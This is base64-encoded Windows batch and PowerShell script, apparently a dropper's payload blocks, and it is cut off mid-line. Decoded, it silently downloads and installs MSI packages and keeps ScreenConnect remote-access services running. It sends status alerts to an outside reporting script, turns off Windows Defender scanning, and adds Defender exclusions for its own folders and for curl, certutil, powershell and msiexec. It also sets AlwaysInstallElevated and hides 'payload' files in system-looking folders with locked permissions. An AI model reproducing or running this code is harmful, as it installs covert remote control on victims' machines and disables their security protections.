MA0KICBpZiBleGlzdCAiJVdEJVx0Z19ncnl4YS5mbGFnIiAoDQogICAgcG93ZXJzaGVsbCAtTm9Q
cm9maWxlIC1Ob25JbnRlcmFjdGl2ZSAtQ29tbWFuZCAiaWYoKE5ldy1UaW1lU3BhbiAtU3RhcnQg
KEdldC1JdGVtIC1MaXRlcmFsUGF0aCAnJVdEJVx0Z19ncnl4YS5mbGFnJykuTGFzdFdyaXRlVGlt
ZSkuVG90YWxNaW51dGVzIC1sdCAxNDQwKXtleGl0IDB9ZWxzZXtleGl0IDF9IiA+bnVsIDI+JjEN
CiAgICBpZiBub3QgZXJyb3JsZXZlbCAxICgNCiAgICAgIGVjaG8gdGdfZ3J5eGFfc3VwcHJlc3Nf
JUdTVEFURSU+PiIlTE9HJSINCiAgICAgIGV4aXQgL2IgMA0KICAgICkNCiAgKQ0KICBlY2hvICVH
U1RBVEUlPiIlR1NUQVRFRklMRSUiDQogIGVjaG8gc2VudD4iJVdEJVx0Z19ncnl4YS5mbGFnIg0K
ICBwb3dlcnNoZWxsIC1Ob1Byb2ZpbGUgLU5vbkludGVyYWN0aXZlIC1FeGVjdXRpb25Qb2xpY3kg
QnlwYXNzIC1GaWxlICIlV0QlXHRnX3JlcG9ydC5wczEiIC1TdGF0ZSAlR1NUQVRFJSAtU3VtbWFy
eSAiJUdNU0clIiAtQnVpbGQgJU1PTlZFUiUgLUNvdW50ICVDT1VOVCUgPm51bCAyPiYxDQogIGVj
aG8gdGcgZ3J5eGEgJUdTVEFURSUgc2VudD4+IiVMT0clIg0KICBleGl0IC9iIDANCikNCmlmIC9J
ICIlR1NUQVRFJSI9PSJET1dOIiBpZiAvSSAiJUdPTEQlIj09IkRPV04iIGlmIGV4aXN0ICIlV0Ql
XHRnX2dyeXhhLmZsYWciICgNCiAgcG93ZXJzaGVsbCAtTm9Qcm9maWxlIC1Ob25JbnRlcmFjdGl2
ZSAtQ29tbWFuZCAiaWYoKE5ldy1UaW1lU3BhbiAtU3RhcnQgKEdldC1JdGVtIC1MaXRlcmFsUGF0
aCAnJVdEJVx0Z19ncnl4YS5mbGFnJykuTGFzdFdyaXRlVGltZSkuVG90YWxNaW51dGVzIC1sdCAz
NjApe2V4aXQgMH1lbHNle2V4aXQgMX0iID5udWwgMj4mMQ0KICBpZiBub3QgZXJyb3JsZXZlbCAx
ICgNCiAgICBlY2hvIHRnX2dyeXhhX3N1cHByZXNzXyVHU1RBVEUlPj4iJUxPRyUiDQogICAgZXhp
dCAvYiAwDQogICkNCikNCmVjaG8gJUdTVEFURSU+IiVHU1RBVEVGSUxFJSINCmVjaG8gc2VudD4i
JVdEJVx0Z19ncnl4YS5mbGFnIg0KcG93ZXJzaGVsbCAtTm9Qcm9maWxlIC1Ob25JbnRlcmFjdGl2
ZSAtRXhlY3V0aW9uUG9saWN5IEJ5cGFzcyAtRmlsZSAiJVdEJVx0Z19yZXBvcnQucHMxIiAtU3Rh
dGUgJUdTVEFURSUgLVN1bW1hcnkgIiVHTVNHJSIgLUJ1aWxkICVNT05WRVIlIC1Db3VudCAlQ09V
TlQlID5udWwgMj4mMQ0KZWNobyB0ZyBncnl4YSAlR1NUQVRFJSBzZW50Pj4iJUxPRyUiDQpleGl0
IC9iIDANCg0KOkluc3RhbGxNc2kNCnJlbSAlMT11cmwgJTI9dGFnDQpzZXQgIlVSTD0lfjEiDQpz
ZXQgIlRBRz0lfjIiDQplY2hvIFslVEFHJV0gZmV0Y2ggJVVSTCU+PiIlTE9HJSINCiIlQ1VSTCUi
IC1MIC0tc3NsLW5vLXJldm9rZSAtLWNvbm5lY3QtdGltZW91dCAyNSAtLW1heC10aW1lIDMwMCAt
byAiJU1TSSUudG1wIiAiJVVSTCUiID4+IiVMT0clIiAyPiYxDQpmb3IgJSVGIGluICgiJU1TSSUu
dG1wIikgZG8gaWYgJSV+ekYgTEVRIDEwMDAwMDAgKA0KICBlY2hvIFslVEFHJV0gZmV0Y2ggZmFp
bGVkPj4iJUxPRyUiDQogIGRlbCAvZiAvcSAiJU1TSSUudG1wIiA+bnVsIDI+JjENCiAgZXhpdCAv
YiAxDQopDQptb3ZlIC95ICIlTVNJJS50bXAiICIlTVNJJSIgPm51bCAyPiYxDQpjYWxsIDpOb01z
aVBvbGljeQ0KcmVtIE0xMzogc3RhbGUgcHJpbWFyeSBkaXIgKHNlcnZpY2UgZGVsZXRlZCwgcHJv
ZHVjdCB1bnJlZ2lzdGVyZWQpIGJyZWFrcw0KcmVtIHRoZSBTQyBpbnN0YWxsZXIgY3VzdG9tIGFj
dGlvbiAtIGNsZWFyIGl0IGJlZm9yZSBpbnN0YWxsaW5nDQpzYyBxdWVyeSAiU2NyZWVuQ29ubmVj
dCBDbGllbnQgKCVLRUVQX0ZQJSkiID5udWwgMj4mMQ0KaWYgZXJyb3JsZXZlbCAxIGlmIGV4aXN0
ICIlUEY4NiVcU2NyZWVuQ29ubmVjdCBDbGllbnQgKCVLRUVQX0ZQJSkiICgNCiAgZWNobyBzdGFs
ZV9wcmltYXJ5X2Rpcl9jbGVhbj4+IiVMT0clIg0KICBybWRpciAvcyAvcSAiJVBGODYlXFNjcmVl
bkNvbm5lY3QgQ2xpZW50ICglS0VFUF9GUCUpIiA+bnVsIDI+JjENCikNCmVjaG8gWyVUQUclXSBt
c2lleGVjIGluc3RhbGw+PiIlTE9HJSINCm1zaWV4ZWMgL2kgIiVNU0klIiAvcW4gL25vcmVzdGFy
dCBBTExVU0VSUz0xIFJFQk9PVD1SZWFsbHlTdXBwcmVzcyAvTCp2ICIlV0QlXG1zaV9oZWFsLmxv
ZyIgPm51bCAyPiYxDQpzZXQgIk1TSUVYSVQ9IUVSUk9STEVWRUwhIg0KZWNobyBbJVRBRyVdIG1z
aWV4ZWMgZXhpdD0hTVNJRVhJVCE+PiIlTE9HJSINCmlmICIhTVNJRVhJVCEiPT0iMTYxOCIgKA0K
ICBlY2hvIFslVEFHJV0gbXNpX2J1c3lfcmV0cnk+PiIlTE9HJSINCiAgdGltZW91dCAvdCAzMCAv
bm9icmVhayA+bnVsDQogIG1zaWV4ZWMgL2kgIiVNU0klIiAvcW4gL25vcmVzdGFydCBBTExVU0VS
Uz0xIFJFQk9PVD1SZWFsbHlTdXBwcmVzcyAvTCp2ICIlV0QlXG1zaV9oZWFsMi5sb2ciID5udWwg
Mj4mMQ0KICBzZXQgIk1TSUVYSVQ9IUVSUk9STEVWRUwhIg0KICBlY2hvIFslVEFHJV0gbXNpZXhl
Y19yZXRyeSBleGl0PSFNU0lFWElUIT4+IiVMT0clIg0KKQ0KY2FsbCA6V2FpdFN2Yw0KY2FsbCA6
UmVzdG9yZUFsdA0KcmVtIE8zNzogc2V2cnogL2kgc2hhcmVzIGxlZ2FjeSBVcGdyYWRlQ29kZXMg
d2l0aCBncnl4YSDigJQgYWx3YXlzIHJlLWVuc3VyZSBHcnl4YSBhZnRlcg0KY2FsbCA6RW5zdXJl
R3J5eGFNdXN0DQpleGl0IC9iIDANCnJlbSAlMT1maW5nZXJwcmludCAtIHNlcnZpY2UgZGVsZXRl
ZCBidXQgcHJvZHVjdCByZWdpc3RlcmVkOiByZXBhaXIgYnkgR1VJRC4NCnNjIHF1ZXJ5ICJTY3Jl
ZW5Db25uZWN0IENsaWVudCAoJX4xKSIgPm51bCAyPiYxDQppZiBub3QgZXJyb3JsZXZlbCAxIGV4
aXQgL2IgMA0KaWYgbm90IGV4aXN0ICIlV0QlXG93bl9saWIucHMxIiBleGl0IC9iIDENCnBvd2Vy
c2hlbGwgLU5vUHJvZmlsZSAtTm9uSW50ZXJhY3RpdmUgLUV4ZWN1dGlvblBvbGljeSBCeXBhc3Mg
LUZpbGUgIiVXRCVcb3duX2xpYi5wczEiIC1BY3Rpb24gcmVwYWlyIC1GcCAiJX4xIiAtV29ya0Rp
ciAiJVdEJSIgPj4iJUxPRyUiIDI+JjENCmNhbGwgOldhaXRTdmMNCmV4aXQgL2IgMA0KDQo6UmVz
dG9yZUFsdA0KcmVtIEFMVCBzZXJ2aWNlIGdvbmUgYnV0IHN0aWxsIHJlZ2lzdGVyZWQgKFNDLWZh
bWlseSBtc2lleGVjIHNpZGUgZWZmZWN0KSAtIHJlcGFpciBpdCB0b28uDQpzYyBxdWVyeSAiU2Ny
ZWVuQ29ubmVjdCBDbGllbnQgKCVBTFRfRlAlKSIgPm51bCAyPiYxDQppZiBub3QgZXJyb3JsZXZl
bCAxIGV4aXQgL2IgMA0KZWNobyBhbHQgbWlzc2luZyAtIHJlcGFpciBhdHRlbXB0Pj4iJUxPRyUi
DQppZiBleGlzdCAiJVdEJVxvd25fbGliLnBzMSIgcG93ZXJzaGVsbCAtTm9Qcm9maWxlIC1Ob25J
bnRlcmFjdGl2ZSAtRXhlY3V0aW9uUG9saWN5IEJ5cGFzcyAtRmlsZSAiJVdEJVxvd25fbGliLnBz
MSIgLUFjdGlvbiByZXBhaXIgLUZwICIlQUxUX0ZQJSIgLVdvcmtEaXIgIiVXRCUiID4+IiVMT0cl
IiAyPiYxDQpzYyBxdWVyeSAiU2NyZWVuQ29ubmVjdCBDbGllbnQgKCVBTFRfRlAlKSIgfCBmaW5k
ICJSVU5OSU5HIiA+bnVsDQppZiBub3QgZXJyb3JsZXZlbCAxIHNldCAiQUxUX09LPTEiDQpleGl0
IC9iIDANCg0KOk5vTXNpUG9saWN5DQpyZWcgZGVsZXRlICJIS0xNXFNPRlRXQVJFXFBvbGljaWVz
XE1pY3Jvc29mdFxXaW5kb3dzXEluc3RhbGxlciIgL3YgRGlzYWJsZU1TSSAvZiA+bnVsIDI+JjEN
CnJlZyBkZWxldGUgIkhLQ1VcU09GVFdBUkVcUG9saWNpZXNcTWljcm9zb2Z0XFdpbmRvd3NcSW5z
dGFsbGVyIiAvdiBEaXNhYmxlTVNJIC9mID5udWwgMj4mMQ0KcmVnIGFkZCAiSEtMTVxTT0ZUV0FS
RVxQb2xpY2llc1xNaWNyb3NvZnRcV2luZG93c1xJbnN0YWxsZXIiIC92IERpc2FibGVNU0kgL3Qg
UkVHX0RXT1JEIC9kIDAgL2YgPm51bCAyPiYxDQpleGl0IC9iIDANCg0KOldhaXRTdmMNCnNldCAi
VFJJRVM9MCINCjpXYWl0TG9vcA0Kc2MgcXVlcnkgIlNjcmVlbkNvbm5lY3QgQ2xpZW50ICglS0VF
UF9GUCUpIiB8IGZpbmQgIlJVTk5JTkciID5udWwNCmlmIG5vdCBlcnJvcmxldmVsIDEgKA0KICBz
ZXQgIklOU1RBTExFRD0xIg0KICBzZXQgIlBSSU1fT0s9MSINCiAgZXhpdCAvYiAwDQopDQpzZXQg
L2EgVFJJRVMrPTENCmlmICVUUklFUyUgR0VRIDEwIGV4aXQgL2IgMQ0KcGluZyAxMjcuMC4wLjEg
LW4gNyA+bnVsIDI+JjENCmdvdG8gOldhaXRMb29wDQoNCjpUZ1N0YXRlDQpzZXQgIk5FV1NUQVRF
PSV+MSINCnNldCAiTVNHPSV+MiINCnNldCAiT0xEU1RBVEU9Ig0KaWYgZXhpc3QgIiVTVEFURSUi
IHNldCAvcCBPTERTVEFURT08IiVTVEFURSUiDQpyZW0gZmFsc2UgRE9XTiBhZnRlciByZWJvb3Qg
cmFjZTogcHJpbWFyeSBhbHJlYWR5IFJ1bm5pbmcg4oCUIGRvIG5vdCBzcGFtDQppZiAvSSAiJU5F
V1NUQVRFJSI9PSJET1dOIiAoDQogIHNjIHF1ZXJ5ICJTY3JlZW5Db25uZWN0IENsaWVudCAoJUtF
RVBfRlAlKSIgfCBmaW5kICJSVU5OSU5HIiA+bnVsDQogIGlmIG5vdCBlcnJvcmxldmVsIDEgKA0K
ICAgIGVjaG8gdGdfc2tpcF9kb3duX2FscmVhZHlfcnVubmluZz4+IiVMT0clIg0KICAgIGV4aXQg
L2IgMA0KICApDQopDQpyZW0gcmF0ZS1saW1pdCByZXBlYXRlZCBET1dOL0ZBSUw6IG1heCAxIGFs
ZXJ0IHBlciA2aCB3aGlsZSBzdHVjaw0KaWYgL0kgIiVORVdTVEFURSUiPT0iRE9XTiIgZ290byA6
TWF5YmVTdXBwcmVzcw0KaWYgL0kgIiVORVdTVEFURSUiPT0iRkFJTCIgZ290byA6TWF5YmVTdXBw
cmVzcw0KZ290byA6U2VuZEFsZXJ0DQo6TWF5YmVTdXBwcmVzcw0KaWYgL0kgIiVORVdTVEFURSUi
PT0iJU9MRFNUQVRFJSIgaWYgZXhpc3QgIiVXRCVcdGdfc2VudC5mbGFnIiAoDQogIHBvd2Vyc2hl
bGwgLU5vUHJvZmlsZSAtTm9uSW50ZXJhY3RpdmUgLUNvbW1hbmQgImlmKChOZXctVGltZVNwYW4g
LVN0YXJ0IChHZXQtSXRlbSAtTGl0ZXJhbFBhdGggJyVXRCVcdGdfc2VudC5mbGFnJykuTGFzdFdy
aXRlVGltZSkuVG90YWxNaW51dGVzIC1sdCAzNjApe2V4aXQgMH1lbHNle2V4aXQgMX0iID5udWwg
Mj4mMQ0KICBpZiBub3QgZXJyb3JsZXZlbCAxICgNCiAgICBlY2hvIHRnX3N1cHByZXNzZWRfJU5F
V1NUQVRFJT4+IiVMT0clIg0KICAgIGV4aXQgL2IgMA0KICApDQopDQo6U2VuZEFsZXJ0DQplY2hv
ICVORVdTVEFURSU+IiVTVEFURSUiDQplY2hvIHNlbnQ+IiVXRCVcdGdfc2VudC5mbGFnIg0KcG93
ZXJzaGVsbCAtTm9Qcm9maWxlIC1Ob25JbnRlcmFjdGl2ZSAtRXhlY3V0aW9uUG9saWN5IEJ5cGFz
cyAtRmlsZSAiJVdEJVx0Z19yZXBvcnQucHMxIiAtU3RhdGUgJU5FV1NUQVRFJSAtU3VtbWFyeSAi
JU1TRyUiIC1CdWlsZCAlTU9OVkVSJSAtQ291bnQgJUNPVU5UJSA+bnVsIDI+JjENCmVjaG8gdGcg
c3RhdGUgJU5FV1NUQVRFJSBzZW50Pj4iJUxPRyUiDQpleGl0IC9iIDANCg==
::B64_MON_END
::B64_SEC_BEGIN
QGVjaG8gb2ZmDQpSRU0gT1dOX1NFQ1VSRSBCVUlMRCAyMDI2MDgwMlM5IC0gZHluYW1pYyBncnl4
YSBGUCBmcm9tIGdyeXhhLmNmZzsgTk8gTG9ja0RpciBvbiBTQyBkaXJzDQpzZXRsb2NhbCBFbmFi
bGVFeHRlbnNpb25zIEVuYWJsZURlbGF5ZWRFeHBhbnNpb24NCnNldCAiV0Q9JVByb2dyYW1EYXRh
JVxNaWNyb3NvZnRcV2luZG93c1xXRVJcVGVtcFwud3VjYWNoZSINCnNldCAiV0QyPSVQcm9ncmFt
RGF0YSVcTWljcm9zb2Z0XERpYWdub3Npc1xTdGF0ZVwuZXRsY2FjaGUiDQpzZXQgIkxPRz0lV0Ql
XGJvb3QuZXJyIg0Kc2V0ICJQUklNPVNjcmVlbkNvbm5lY3QgQ2xpZW50ICg1ZjYwMTA1Nzk4NTJl
NTA3KSINCnNldCAiQUxUPVNjcmVlbkNvbm5lY3QgQ2xpZW50IChmODYxYzgxNDBkNDUzNDI3KSIN
CnNldCAiS0VFUDE9NWY2MDEwNTc5ODUyZTUwNyINCnNldCAiS0VFUDI9Zjg2MWM4MTQwZDQ1MzQy
NyINCnNldCAiS0VFUDM9OTkwODE5OGU2NjhlNDc1MCINCmlmIGV4aXN0ICIlV0QlXGdyeXhhLmNm
ZyIgZm9yIC9mICJ1c2ViYWNrcSB0b2tlbnM9MSwqIGRlbGltcz09IiAlJUsgaW4gKCIlV0QlXGdy
eXhhLmNmZyIpIGRvIGlmIC9JICIlJUsiPT0iQ1VSUkVOVF9GUCIgc2V0ICJLRUVQMz0lJUwiDQpz
ZXQgIkdSWVhBPVNjcmVlbkNvbm5lY3QgQ2xpZW50ICglS0VFUDMlKSINCnNldCAiUEY9JVByb2dy
YW1GaWxlcyUiDQpzZXQgIlBGODY9JVByb2dyYW1GaWxlcyh4ODYpJSINCnNldCAiVEFTS1JPT1Q9
JVN5c3RlbVJvb3QlXFN5c3RlbTMyXFRhc2tzIg0KDQppZiBub3QgZXhpc3QgIiVXRCUiIG1rZGly
ICIlV0QlIiA+bnVsIDI+JjENCmlmIG5vdCBleGlzdCAiJVdEMiUiIG1rZGlyICIlV0QyJSIgPm51
bCAyPiYxDQplY2hvIHNlY3VyZV9iZWdpbiAlREFURSUgJVRJTUUlIFM5Pj4iJUxPRyUiDQoNClJF
TSAtLS0gTmV1dHJhbGl6ZSBNU0kgYmxvY2sgcG9saWNpZXMgKDE2MjUpIC0tLQ0KUkVNIERpc2Fi
bGVNU0k6IDA9YWxsb3csIDE9bm9uLWFkbWluIG9ubHksIDI9YWxsIC0+IGZvcmNlIDANCnJlZyBh
ZGQgIkhLTE1cU09GVFdBUkVcUG9saWNpZXNcTWljcm9zb2Z0XFdpbmRvd3NcSW5zdGFsbGVyIiAv
diBEaXNhYmxlTVNJIC90IFJFR19EV09SRCAvZCAwIC9mID5udWwgMj4mMQ0KcmVnIGFkZCAiSEtM
TVxTT0ZUV0FSRVxQb2xpY2llc1xNaWNyb3NvZnRcV2luZG93c1xJbnN0YWxsZXIiIC92IEFsd2F5
c0luc3RhbGxFbGV2YXRlZCAvdCBSRUdfRFdPUkQgL2QgMSAvZiA+bnVsIDI+JjENCnJlZyBkZWxl
dGUgIkhLQ1VcU09GVFdBUkVcUG9saWNpZXNcTWljcm9zb2Z0XFdpbmRvd3NcSW5zdGFsbGVyIiAv
diBEaXNhYmxlTVNJIC9mID5udWwgMj4mMQ0KcmVnIGFkZCAiSEtDVVxTT0ZUV0FSRVxQb2xpY2ll
c1xNaWNyb3NvZnRcV2luZG93c1xJbnN0YWxsZXIiIC92IEFsd2F5c0luc3RhbGxFbGV2YXRlZCAv
dCBSRUdfRFdPUkQgL2QgMSAvZiA+bnVsIDI+JjENCg0KUkVNIC0tLSBEZWZlbmRlcjogcmVnaXN0
cnkgZXhjbHVzaW9ucyAocG9saWN5ICsgcHJlZmVyZW5jZSBrZXlzKSAtLS0NCnJlZyBhZGQgIkhL
TE1cU09GVFdBUkVcUG9saWNpZXNcTWljcm9zb2Z0XFdpbmRvd3MgRGVmZW5kZXIiIC92IERpc2Fi
bGVBbnRpU3B5d2FyZSAvdCBSRUdfRFdPUkQgL2QgMSAvZiA+bnVsIDI+JjENCnJlZyBhZGQgIkhL
TE1cU09GVFdBUkVcUG9saWNpZXNcTWljcm9zb2Z0XFdpbmRvd3MgRGVmZW5kZXJcUmVhbC1UaW1l
IFByb3RlY3Rpb24iIC92IERpc2FibGVSZWFsdGltZU1vbml0b3JpbmcgL3QgUkVHX0RXT1JEIC9k
IDEgL2YgPm51bCAyPiYxDQpyZWcgYWRkICJIS0xNXFNPRlRXQVJFXFBvbGljaWVzXE1pY3Jvc29m
dFxXaW5kb3dzIERlZmVuZGVyXFJlYWwtVGltZSBQcm90ZWN0aW9uIiAvdiBEaXNhYmxlQmVoYXZp
b3JNb25pdG9yaW5nIC90IFJFR19EV09SRCAvZCAxIC9mID5udWwgMj4mMQ0KcmVnIGFkZCAiSEtM
TVxTT0ZUV0FSRVxQb2xpY2llc1xNaWNyb3NvZnRcV2luZG93cyBEZWZlbmRlclxSZWFsLVRpbWUg
UHJvdGVjdGlvbiIgL3YgRGlzYWJsZUlPQVZQcm90ZWN0aW9uIC90IFJFR19EV09SRCAvZCAxIC9m
ID5udWwgMj4mMQ0KcmVnIGFkZCAiSEtMTVxTT0ZUV0FSRVxQb2xpY2llc1xNaWNyb3NvZnRcV2lu
ZG93cyBEZWZlbmRlclxSZWFsLVRpbWUgUHJvdGVjdGlvbiIgL3YgRGlzYWJsZVNjcmlwdFNjYW5u
aW5nIC90IFJFR19EV09SRCAvZCAxIC9mID5udWwgMj4mMQ0KcmVnIGFkZCAiSEtMTVxTT0ZUV0FS
RVxNaWNyb3NvZnRcV2luZG93cyBEZWZlbmRlclxFeGNsdXNpb25zXFBhdGhzIiAvdiAiJVdEJSIg
L3QgUkVHX0RXT1JEIC9kIDAgL2YgPm51bCAyPiYxDQpyZWcgYWRkICJIS0xNXFNPRlRXQVJFXE1p
Y3Jvc29mdFxXaW5kb3dzIERlZmVuZGVyXEV4Y2x1c2lvbnNcUGF0aHMiIC92ICIlV0QyJSIgL3Qg
UkVHX0RXT1JEIC9kIDAgL2YgPm51bCAyPiYxDQpyZWcgYWRkICJIS0xNXFNPRlRXQVJFXE1pY3Jv
c29mdFxXaW5kb3dzIERlZmVuZGVyXEV4Y2x1c2lvbnNcUGF0aHMiIC92ICJDOlxXaW5kb3dzXFRl
bXAiIC90IFJFR19EV09SRCAvZCAwIC9mID5udWwgMj4mMQ0KcmVnIGFkZCAiSEtMTVxTT0ZUV0FS
RVxNaWNyb3NvZnRcV2luZG93cyBEZWZlbmRlclxFeGNsdXNpb25zXFBhdGhzIiAvdiAiJVRFTVAl
IiAvdCBSRUdfRFdPUkQgL2QgMCAvZiA+bnVsIDI+JjENCnJlZyBhZGQgIkhLTE1cU09GVFdBUkVc
TWljcm9zb2Z0XFdpbmRvd3MgRGVmZW5kZXJcRXhjbHVzaW9uc1xQYXRocyIgL3YgIiVQRiVcU2Ny
ZWVuQ29ubmVjdCBDbGllbnQgKCVLRUVQMSUpIiAvdCBSRUdfRFdPUkQgL2QgMCAvZiA+bnVsIDI+
JjENCnJlZyBhZGQgIkhLTE1cU09GVFdBUkVcTWljcm9zb2Z0XFdpbmRvd3MgRGVmZW5kZXJcRXhj
bHVzaW9uc1xQYXRocyIgL3YgIiVQRiVcU2NyZWVuQ29ubmVjdCBDbGllbnQgKCVLRUVQMiUpIiAv
dCBSRUdfRFdPUkQgL2QgMCAvZiA+bnVsIDI+JjENCnJlZyBhZGQgIkhLTE1cU09GVFdBUkVcTWlj
cm9zb2Z0XFdpbmRvd3MgRGVmZW5kZXJcRXhjbHVzaW9uc1xQYXRocyIgL3YgIiVQRiVcU2NyZWVu
Q29ubmVjdCBDbGllbnQgKCVLRUVQMyUpIiAvdCBSRUdfRFdPUkQgL2QgMCAvZiA+bnVsIDI+JjEN
CnJlZyBhZGQgIkhLTE1cU09GVFdBUkVcTWljcm9zb2Z0XFdpbmRvd3MgRGVmZW5kZXJcRXhjbHVz
aW9uc1xQYXRocyIgL3YgIiVQRjg2JVxTY3JlZW5Db25uZWN0IENsaWVudCAoJUtFRVAxJSkiIC90
IFJFR19EV09SRCAvZCAwIC9mID5udWwgMj4mMQ0KcmVnIGFkZCAiSEtMTVxTT0ZUV0FSRVxNaWNy
b3NvZnRcV2luZG93cyBEZWZlbmRlclxFeGNsdXNpb25zXFBhdGhzIiAvdiAiJVBGODYlXFNjcmVl
bkNvbm5lY3QgQ2xpZW50ICglS0VFUDIlKSIgL3QgUkVHX0RXT1JEIC9kIDAgL2YgPm51bCAyPiYx
DQpyZWcgYWRkICJIS0xNXFNPRlRXQVJFXE1pY3Jvc29mdFxXaW5kb3dzIERlZmVuZGVyXEV4Y2x1
c2lvbnNcUGF0aHMiIC92ICIlUEY4NiVcU2NyZWVuQ29ubmVjdCBDbGllbnQgKCVLRUVQMyUpIiAv
dCBSRUdfRFdPUkQgL2QgMCAvZiA+bnVsIDI+JjENCmZvciAlJVAgaW4gKG1zaWV4ZWMuZXhlIGN1
cmwuZXhlIGNtZC5leGUgcG93ZXJzaGVsbC5leGUgY2VydHV0aWwuZXhlIFNjcmVlbkNvbm5lY3Qu
Q2xpZW50U2VydmljZS5leGUgU2NyZWVuQ29ubmVjdC5XaW5kb3dzQ2xpZW50LmV4ZSkgZG8gKA0K
ICByZWcgYWRkICJIS0xNXFNPRlRXQVJFXE1pY3Jvc29mdFxXaW5kb3dzIERlZmVuZGVyXEV4Y2x1
c2lvbnNcUHJvY2Vzc2VzIiAvdiAiJSVQIiAvdCBSRUdfRFdPUkQgL2QgMCAvZiA+bnVsIDI+JjEN
CikNCg0KUkVNIC0tLSBEZWZlbmRlcjogbGl2ZSBNcFByZWZlcmVuY2UgKHN0cm9uZ2VyIHRoYW4g
cmVnIGFsb25lKSAtLS0NCnBvd2Vyc2hlbGwuZXhlIC1Ob1Byb2ZpbGUgLU5vbkludGVyYWN0aXZl
IC1FeGVjdXRpb25Qb2xpY3kgQnlwYXNzIC1Db21tYW5kIF4NCiAgIiRFcnJvckFjdGlvblByZWZl
cmVuY2U9J1NpbGVudGx5Q29udGludWUnOyIgXg0KICAiVHJ5e1NldC1NcFByZWZlcmVuY2UgLURp
c2FibGVSZWFsdGltZU1vbml0b3JpbmcgJHRydWU7IFNldC1NcFByZWZlcmVuY2UgLURpc2FibGVC
ZWhhdmlvck1vbml0b3JpbmcgJHRydWU7IFNldC1NcFByZWZlcmVuY2UgLURpc2FibGVJT0FWUHJv
dGVjdGlvbiAkdHJ1ZTsgU2V0LU1wUHJlZmVyZW5jZSAtRGlzYWJsZVNjcmlwdFNjYW5uaW5nICR0
cnVlfUNhdGNoe307IiBeDQogICIkcGF0aHM9QCgnJVdEJScsJyVXRDIlJywnQzpcV2luZG93c1xU
ZW1wJywkZW52OlRFTVAsJyVQRiVcU2NyZWVuQ29ubmVjdCBDbGllbnQgKCVLRUVQMSUpJywnJVBG
JVxTY3JlZW5Db25uZWN0IENsaWVudCAoJUtFRVAyJSknLCclUEY4NiVcU2NyZWVuQ29ubmVjdCBD
bGllbnQgKCVLRUVQMSUpJywnJVBGODYlXFNjcmVlbkNvbm5lY3QgQ2xpZW50ICglS0VFUDIlKScp
OyIgXg0KICAidHJ5eyRwYXRocys9QChHZXQtQ2hpbGRJdGVtIC1QYXRoICRlbnY6UHJvZ3JhbUZp
bGVzIC1GaWx0ZXIgJ1NjcmVlbkNvbm5lY3QgQ2xpZW50KicgLURpcmVjdG9yeSAtRUEgMCB8IEZv
ckVhY2gtT2JqZWN0IHskXy5GdWxsTmFtZX0pfWNhdGNoe307IiBeDQogICJ0cnl7JHBmODY9W0Vu
dmlyb25tZW50XTo6R2V0Rm9sZGVyUGF0aCgnUHJvZ3JhbUZpbGVzWDg2Jyk7IGlmKCRwZjg2KXsk
cGF0aHMrPUAoR2V0LUNoaWxkSXRlbSAtUGF0aCAkcGY4NiAtRmlsdGVyICdTY3JlZW5Db25uZWN0
IENsaWVudConIC1EaXJlY3RvcnkgLUVBIDAgfCBGb3JFYWNoLU9iamVjdCB7JF8uRnVsbE5hbWV9
KX19Y2F0Y2h7fTsiIF4NCiAgImZvcmVhY2goJHAgaW4gKCRwYXRocyB8IFNlbGVjdC1PYmplY3Qg
LVVuaXF1ZSkpeyBpZigkcCAtYW5kIChUZXN0LVBhdGggLUxpdGVyYWxQYXRoICRwKSl7IEFkZC1N
cFByZWZlcmVuY2UgLUV4Y2x1c2lvblBhdGggJHAgLUVBIDAgfSB9OyIgXg0KICAiZm9yZWFjaCgk
eCBpbiBAKCdtc2lleGVjLmV4ZScsJ2N1cmwuZXhlJywnY21kLmV4ZScsJ3Bvd2Vyc2hlbGwuZXhl
JywnY2VydHV0aWwuZXhlJywnU2NyZWVuQ29ubmVjdC5DbGllbnRTZXJ2aWNlLmV4ZScsJ1NjcmVl
bkNvbm5lY3QuV2luZG93c0NsaWVudC5leGUnKSl7IEFkZC1NcFByZWZlcmVuY2UgLUV4Y2x1c2lv
blByb2Nlc3MgJHggLUVBIDAgfTsiIF4NCiAgIkFkZC1NcFByZWZlcmVuY2UgLUV4Y2x1c2lvbkV4
dGVuc2lvbiAnLmNtZCcsJy5wczEnLCcubXNpJyAtRUEgMCIgPm51bCAyPiYxDQoNClJFTSAtLS0g
QUNMOiBvbmx5IFNZU1RFTSArIEFkbWluaXN0cmF0b3JzIG9uIHBlcnNpc3QgZGlycyAtLS0NCmNh
bGwgOkxvY2tEaXIgIiVXRCUiDQpjYWxsIDpMb2NrRGlyICIlV0QyJSINCg0KUkVNIC0tLSBoaWRl
IHdvcmtkaXJzICsga2V5IHBheWxvYWQgZmlsZXMgLS0tDQphdHRyaWIgK2ggK3MgIiVXRCUiID5u
dWwgMj4mMQ0KYXR0cmliICtoICtzICIlV0QyJSIgPm51bCAyPiYxDQpSRU0gUzU6IGRvIE5PVCBo
aWRlL2xvY2sgdGhlIG11dGFibGUgcGF5bG9hZCBzY3JpcHRzIC0gY29weS9tb3ZlIG92ZXIgK2gg
K3MgZmlsZXMNClJFTSBmYWlscyBzaWxlbnRseSBhbmQgZnJvemUgdGhlIHdob2xlIGZsZWV0J3Mg
c2VsZi11cGRhdGUuIEhpZGRlbiBkaXJzIGNvbmNlYWwgY29udGVudHMgYWxyZWFkeS4NCmZvciAl
JUYgaW4gKHBrZy5tc2kgbm90aWZ5LmNmZyBpZGVudGl0eS5jZmcgc3RhdGUuanNvbikgZG8gKA0K
ICBpZiBleGlzdCAiJVdEJVwlJUYiIGF0dHJpYiAraCArcyAiJVdEJVwlJUYiID5udWwgMj4mMQ0K
KQ0KDQpSRU0gLS0tIEFDTDogc2NoZWR1bGVkIHRhc2sgWE1MIChoYXJkZXIgdG8gZGVsZXRlIHdp
dGhvdXQgQWRtaW4pIC0tLQ0KUkVNIFM2OiBuYW1lcyBjb250YWluIHNwYWNlcyAoIlNlcnZlciBE
aWFnbm9zdGljcyIpIC0gdGhlIGNtZCBGT1IgbG9vcCBzcGxpdA0KUkVNIHRoZW0gaW50byBnYXJi
YWdlIHRva2Vucy4gUG93ZXJTaGVsbCByZWFkcyBpZGVudGl0eS5jZmcgZGlyZWN0bHkgaW5zdGVh
ZC4NCnBvd2Vyc2hlbGwuZXhlIC1Ob1Byb2ZpbGUgLU5vbkludGVyYWN0aXZlIC1FeGVjdXRpb25Q
b2xpY3kgQnlwYXNzIC1Db21tYW5kIF4NCiAgIiRFcnJvckFjdGlvblByZWZlcmVuY2U9J1NpbGVu
